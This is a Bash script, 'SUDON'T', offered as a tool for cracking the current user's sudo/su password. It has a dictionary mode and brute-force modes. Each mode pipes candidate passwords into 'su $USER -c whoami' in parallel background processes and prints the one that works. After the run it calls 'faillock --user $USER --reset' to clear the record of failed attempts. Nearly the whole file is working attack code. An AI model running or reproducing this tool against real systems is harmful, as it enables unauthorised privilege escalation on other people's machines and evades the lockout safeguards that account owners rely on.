#!/bin/bash

##  $$$$$$\  $$\   $$\ $$$$$$$\   $$$$$$\  $$\   $$\ $$\ $$$$$$$$\
## $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$$\  $$ |$  |\__$$  __|
## $$ /  \__|$$ |  $$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |\_/    $$ |
## \$$$$$$\  $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ $$\$$ |       $$ |
##  \____$$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ \$$$$ |       $$ |
## $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |       $$ |
## \$$$$$$  |\$$$$$$  |$$$$$$$  | $$$$$$  |$$ | \$$ |       $$ |
##  \______/  \______/ \_______/  \______/ \__|  \__|       \__|

##
## Simple and primitive `sudo` dictionary and bruteforce attack tool. **No hash required!**
##

## Created by @turtureanu

ctrl_c() {
  printf "\nGoodbye! (Unexpected!)\n"
  exit 1
}

dictionary_attack() {
  declare dictionary

  # Ask for the path until it is valid
  while [[ ! -f "$dictionary" ]]; do
    printf "\n\nDictionary path?\n> "
    read -r dictionary
  done

  printf "\n"
  LINES=$(wc -l "$dictionary")
  progress=0

  # setting IFS is necessary in order to print outside of eval from inside the loop
  IFS=$'\n'

  # shellcheck disable=SC2034
  while read -r line; do
    progress=$((progress + 1))

    echo -ne "$progress/$LINES passwords checked (checks *all* passwords)\r"
    # TODO: find a way to stop the cracking after finding the password
    # the trick here is that we're running all of these instances in parallel, which is quite fast
    # if the `su` command returns 0 (SUCCESS) then the `echo Password` command gets executed and it prints the password used to gain access
    eval 'printf "$line" | su $USER -c whoami &>/dev/null && printf "\n\n==========================\n    \e[1;32mDONE! DONE! DONE!\e[0m\n==========================\n\nPassword: \e[1;31m%s\e[0m\n\n" "$line"' &# <- get a hold of this poison!
  done \
    <"$dictionary"
  wait
}

charset=('a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9' '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '-' '=' '[' ']' '{' '}' $'\\' $'\'' '|' ';' ':' '"' '<' '>' ',' '.' '?')
charset_length=${#charset[@]}

dynamic_bruteforce() {
  local length=$1

  for ((i = 0; i < charset_length ** length; i++)); do # iterate through all possible combinations
    pass=''

    base=$i # a^b, where a is `charset_length` and b is `length`

    # replace current character with next character
    while ((base >= charset_length)); do
      index=$((base % charset_length))
      pass="${charset[$index]}$pass"
      base=$((base / charset_length - 1))
    done

    pass="${charset[$base]}$pass"

    printf "Cracking... %s\r" "$pass"

    # setting IFS is necessary in order to print outside of eval from inside the loop
    IFS=$'\n'
    # TODO: find a way to stop the cracking after finding the password
    # the trick here is that we're running all of these instances in parallel, which is quite fast
    # if the `su` command returns 0 (SUCCESS) then the `echo Password` command gets executed and it prints the password used to gain access
    eval 'printf "%s" "$pass" | su $USER -c whoami &>/dev/null && printf "\n\n==========================\n    \e[1;32mDONE! DONE! DONE!\e[0m\n==========================\n\nPassword: \e[1;31m%s\e[0m\n\n" "$pass"' &# <- get a hold of this poison!
  done
}

static_bruteforce() {
  local length=$1
  local indexes=(0)

  local max_index=$((charset_length - 1))
  local index=0

  while [[ ${indexes[0]} -ne $max_index ]]; do # loop until the last index
    local pass=""

    # go to next char
    for ((i = 0; i < length; i++)); do
      local char_index="${indexes[$i]}"
      local char="${charset[$char_index]}"
      pass+="$char"
    done

    printf "Cracking %s\r" "$pass"

    # setting IFS is necessary in order to print outside of eval from inside the loop
    IFS=$'\n'
    # TODO: find a way to stop the cracking after finding the password
    # the trick here is that we're running all of these instances in parallel, which is quite fast
    # if the `su` command returns 0 (SUCCESS) then the `echo Password` command gets executed and it prints the password used to gain access
    eval 'printf "%s" "$pass" | su $USER -c whoami &>/dev/null && printf "\n\n==========================\n    \e[1;32mDONE! DONE! DONE!\e[0m\n==========================\n\nPassword: \e[0;31m%s\e[0m\n\n" "$pass"' &# <- get a hold of this poison!

    # increment indexes
    for ((i = length - 1; i >= 0; i--)); do
      local current_index="${indexes[$i]}"
      if [[ $current_index -eq $max_index ]]; then # if the current index is the max index
        indexes[i]=0                               # reset the index to 0
      else
        indexes[i]=$((current_index + 1)) # else increment
        break
      fi
    done
  done
}

bruteforce_attack() {
  PS3="> "
  printf "\n"

  select opt in "Dynamic length (scale up)" "Static length"; do
    case $opt in
    "Dynamic length (scale up)")
      while [[ -z "$length" ]]; do
        printf "\n\nMaximum password length?"
        printf "\n> "
        read -r length
      done

      dynamic_bruteforce "$length"
      break
      ;;
    "Static length")
      while [[ -z "$length" ]]; do
        printf "\n\nPassword length?"
        printf "\n> "
        read -r length
      done

      static_bruteforce "$length"
      break
      ;;
    esac
  done
}

print_menu() {
  PS3="> "

  select mode in "Dictionary Attack" "Bruteforce Attack" "Exit"; do
    case $mode in
    "Dictionary Attack")
      dictionary_attack
      break
      ;;
    "Bruteforce Attack")
      bruteforce_attack
      break
      ;;
    "Exit")
      break
      ;;
    *) ;;
    esac
  done
}

# ==================
#    SCRIPT START
# ==================

printf "\n \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\\"
printf "\n\033[31m\$\033[0m\033[31m\$\033[0m  __\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m  __\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m  __\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m  |\__\033[31m\$\033[0m\033[31m\$\033[0m  __|"
printf "\n\033[31m\$\033[0m\033[31m\$\033[0m /  \__|\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m /  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m |\_/    \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n \\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m \033[31m\$\033[0m\033[31m\$\033[0m\\\\\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n \____\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m \\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n\033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |\\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n\\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  |\\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  |\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  | \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  |\033[31m\$\033[0m\033[31m\$\033[0m | \\\\\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n \______/  \______/ \_______/  \______/ \__|  \__|       \__|\n\n"

set -o errexit -o noclobber -o pipefail
trap '' TSTP    # ignore ctrl + z, 'cause that could be unpleasant
trap ctrl_c INT # display exit message

print_menu

# In case su limits us after we finish bruteforcing
faillock --user "$USER" --reset # reset the password attempts

printf "\nGoodbye!\n"
